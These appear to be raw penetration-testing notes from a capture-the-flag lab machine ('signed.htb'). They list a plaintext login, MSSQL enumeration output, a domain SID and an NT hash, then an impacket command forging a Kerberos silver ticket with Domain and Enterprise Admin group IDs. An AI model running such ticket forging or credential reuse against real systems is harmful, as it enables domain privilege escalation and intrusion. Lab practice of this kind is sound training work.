
10.10.11.90
scott / Sm230#C5NatH


```
Database Name                  Owner
------------------------------ -----
master                         sa   
model                          sa   
msdb                           sa   
tempdb                         sa   
Total: 4 database(s)
```

```
SELECT sp.name AS LoginName, sp.type_desc AS LoginType, sp.is_disabled AS IsDisabled, CONVERT(VARCHAR(1000), sp.sid, 1) AS SIDHex,  sp.create_date AS CreatedDate, sp.modify_date AS ModifiedDate, sp.default_database_name AS DefaultDatabase, sp.default_language_name AS DefaultLanguage, CASE WHEN rm.role_principal_id IS NOT NULL THEN 'Yes' ELSE 'No' END AS IsSysAdmin, CASE WHEN pw.is_policy_checked = 1 THEN 'Yes' ELSE 'No' END AS PasswordPolicyEnforced, CASE WHEN pw.is_expiration_checked = 1 THEN 'Yes' ELSE 'No' END AS PasswordExpirationEnforced FROM sys.server_principals sp LEFT JOIN sys.server_role_members rm ON sp.principal_id = rm.member_principal_id AND rm.role_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name = 'sysadmin') LEFT JOIN sys.sql_logins pw ON sp.principal_id = pw.principal_id WHERE sp.type IN ('S', 'U', 'G') AND sp.name NOT LIKE '##%'  ORDER BY sp.name;
```


```
S-1-5-21-4088429403-1159899800-2753317549
ef699384c3285c54128a3ee1ddb1a0cc
```

```
sudo ntpdate time.google.com
mssqlclient.py -k -no-pass dc01.signed.htb -windows-auth
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105,512,519 -user-id 1103 mssqlsvc
```
